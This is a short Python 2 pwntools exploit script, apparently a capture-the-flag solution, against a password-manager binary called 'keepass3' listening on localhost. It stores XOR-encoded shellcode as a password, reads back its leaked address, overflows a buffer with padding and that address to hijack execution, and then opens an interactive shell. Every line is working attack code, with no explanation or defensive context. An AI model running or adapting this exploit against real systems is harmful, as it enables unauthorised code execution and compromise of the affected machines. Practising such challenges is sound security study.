#!/usr/bin/python2
# pylint: disable-all
from pwn import *

context.binary = ELF('./public/keepass3')
#p = process("./public/keepass3")
p = remote("localhost", 15003)

def store_password(p, password):
    p.sendlineafter("option:", "1")
    p.sendlineafter("password?", password)
    p.recvuntil("at ")
    addr = p.recvuntil(".", drop=True)
    return int(addr, 16)

def xor(data, key):
    result = ""
    for index, c in enumerate(data):
        result += chr(ord(c) ^ ord(key[index%len(key)]))
    return result

# set master key to AAAAAAAA
KEY = "A"*8
p.sendlineafter("key?", KEY)

shellcode = asm(shellcraft.sh())
shellcode = xor(shellcode, KEY)

shellcode_addr = store_password(p, shellcode)
store_password(p, "skip")
store_password(p, "skip")
store_password(p, "skip")

PAYLOAD  = "\x90"*24 # padding
PAYLOAD += p64(shellcode_addr)
PAYLOAD  = xor(PAYLOAD, KEY)

store_password(p, PAYLOAD)
p.sendlineafter("option:", "3") # quit

p.interactive()
